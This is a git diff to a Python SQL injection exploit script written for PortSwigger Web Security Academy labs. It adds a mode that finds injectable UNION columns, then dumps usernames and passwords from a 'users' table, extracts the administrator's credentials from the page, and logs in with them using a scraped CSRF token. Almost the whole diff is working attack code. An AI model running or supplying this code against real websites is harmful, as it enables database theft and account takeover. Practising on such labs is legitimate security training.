@@ -2,6 +2,7 @@ import requests
 import sys
 import re
 import urllib3
+from urllib.parse import urljoin, urlparse
 from bs4 import BeautifulSoup
 import signal
 
@@ -82,6 +83,22 @@ def error_usage(exp):
         print(
             "[-] Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text"
         )
+    elif exp == "sc":
+        print(
+            "[-] Usage: %s <exploit_type> <payload_type> <url> <path_param>"
+            % sys.argv[0]
+        )
+        print(
+            '[-] Example: python3 %s sc orderby https://website.net "/filter?category=Gifts"'
+            % sys.argv[0]
+        )
+        print(
+            '[-] Example: python3 %s sc union https://website.net "/filter?category=Gifts"'
+            % sys.argv[0]
+        )
+        print(
+            "[-] Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables"
+        )
     # sys.exit(-1)
 
 
@@ -138,9 +155,42 @@ def run_exploit(args):
         # If it doesn't have all the parameters, we print usage.
         except IndexError as error:
             error_usage(exploit_type)
+    elif exploit_type == "sc":
+        try:
+            payload_type, url, path_param = sys.argv[2], sys.argv[3], sys.argv[4]
+            union_creds = StringCreds(payload_type, url, path_param)
+            num = union_creds.get_column_number(payload_type, url, path_param)
+            if num:
+                union_creds.exploit_sqli(num, url, path_param)
+        # If it doesn't have all the parameters, we print usage.
+        except IndexError as error:
+            error_usage(exploit_type)
     elif exploit_type not in exploit_types:
         print(f'That "{exploit_type}" exploit type doesn\'t exist here.')
         sys.exit(-1)
+
+
+""" get_token() ################################################################
+Search in the HTML with BeautifulSoup for the CSRF token and return it.
+wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """
+
+
+def get_token(sess, url):
+    # print(sys.argv[2], sys.argv[3], sys.argv[4])
+    try:
+        req = sess.get(url, verify=False, proxies=proxies)
+        # Check the HTML to see where to parse the CSRF from.
+        beau_soup = BeautifulSoup(req.text, "html.parser")
+        # Find the first input element and get its value.
+        csrf = beau_soup.find("input")["value"]
+        return csrf
+    except Exception as e:
+        template = "An exception of type {0} occurred. Arguments:\n{1!r}"
+        message = template.format(type(e).__name__, e.args)
+        if type(e).__name__ == "ProxyError":
+            print("Error Type: ProxyError. Check the proxy.")
+        else:
+            print("CSRF Error Return Type: ", message)
 
 
 """ WhereClause ################################################################
@@ -178,7 +228,7 @@ class WhereClause:
             print("[-] SQL injection unsuccessful...")
 
 
-""" LoginBypass() ##############################################################
+""" LoginBypass ################################################################
 SQLi vulnerability in the login function. This is an SQL injection attack where 
 you can log in to the application as the administrator user.
 https://portswigger.net/web-security/sql-injection/lab-login-bypass
@@ -434,6 +484,122 @@ class StringData:
 
     def exploit_sqli(self, num, url, path_param, hint):
         text_found = self.exploit_sqli_string(num, url, path_param, hint)
+        if text_found:
+            print("[+] SQL injection successful...")
+        else:
+            print("[-] The SQLi was not successful...")
+
+
+""" StringCreds #################################################################
+Loop though the column numbers, test each request for SQLi and check the HTML 
+for when the query text matches, run the SQLi and check for credentials, then
+log in with the credentials.
+############################################################################ """
+
+
+class StringCreds:
+    def __init__(self, payload_type, url, path_param) -> None:
+        self.payload_type = (payload_type,)
+        self.url = (url,)
+        self.path_param = path_param
+        self.text = False
+
+    # Call UnionCols.column_number() to get number of columns.
+    def get_column_number(self, payload_type, url, path_param):
+        col_num = UnionCols(payload_type, url, path_param)
+        num = col_num.column_number(payload_type, url, path_param)
+        return num
+
+    def exploit_sqli_creds(self, num_col, url, path_param):
+        sess = requests.Session()
+        # Get the token before attempting to log in.
+        login_url = urljoin(url, urlparse(url).path) + "/login"
+        # login_bypass = LoginBypass(sess, url, payload, text)
+        csrf = get_token(sess, login_url)
+        print("CSRF: ", csrf)
+        print("[+] Testing if payload is getting injected into HTML")
+        stop = num_col
+        idx = 0
+        try:
+            for i in range(1, num_col + 1):
+                # Set up a union select payload. Starts with sting and NULL and
+                # replaces NULL with another string on the next round.
+                # 1: ' union select 'a', NULL--
+                # 2: ' union select 'a', 'a'--
+                string = "'a'"
+                columns = "NULL" * (num_col - 1)
+                payload_list = [string]
+                payload_list.append(columns)
+                payload_list[i - 1] = string
+                sql_payload = "' union select " + ", ".join(payload_list) + "--"
+                print(i, ": ", sql_payload)
+                # Get request to check in the HTML for the printed payload.
+                req = requests.get(
+                    url + path_param + sql_payload, verify=False, proxies=proxies
+                )
+                soup = BeautifulSoup(req.text, "html.parser")
+                # Get the specific HTML where the payload would be injected.
+                response = soup.find_all("section", attrs={"class": "ecoms-pageheader"})
+                uni = "union select"
+                for res in response:
+                    temp = res.get_text(" ", strip=True)
+                    if uni in temp:
+                        print("[-] UNION found in HTML:")
+                        print(res)
+                    else:
+                        print("[+] UNION not found in HTML")
+
+                idx = idx + 1
+                # Starting SQL Injection and attempting to log in as administrator.
+                if idx == stop:
+                    print(idx, ": Starting SQL Injection...")
+                    # Payload for getting the credentials.
+                    sql_payload2 = "' UNION select username, password from users--"
+                    req = requests.get(
+                        url + path_param + sql_payload2, verify=False, proxies=proxies
+                    )
+                    soup = BeautifulSoup(req.text, "html.parser")
+                    table_rows = soup.find_all("tr")
+                    for tr in table_rows:
+                        if "administrator" in tr.text:
+                            print(
+                                "[+] Administrator username and password found in this tr tag!"
+                            )
+                            print(tr.get_text())
+                            creds = tr.get_text().split("\n")
+                            creds = list(filter(None, creds))
+                            # print(creds)
+                            # Log in with credentials.
+                            data = {
+                                "csrf": csrf,
+                                "username": creds[0],
+                                "password": creds[1],
+                            }
+                            # Send a POST request.
+                            try:
+                                req = sess.post(
+                                    login_url, data=data, verify=False, proxies=proxies
+                                )
+                                # Check if the request logged in by looking in the response text.
+                                # If true, it means the exploit worked as intended.
+                                res = req.text
+                                if "administrator" in res:
+                                    print("Logged in as administrator")
+                                    return True
+                                else:
+                                    print("Can't log in")
+                                    return False
+                            except Exception as e:
+                                print("Error Return Type: ", type(e))
+                            # return True
+                        else:
+                            print("[-] Administrator not found in this tr...")
+            return False
+        except Exception as e:
+            print("SQLi Error Return Type: ", type(e))
+
+    def exploit_sqli(self, num, url, path_param):
+        text_found = self.exploit_sqli_creds(num, url, path_param)
         if text_found:
             print("[+] SQL injection successful...")
         else:
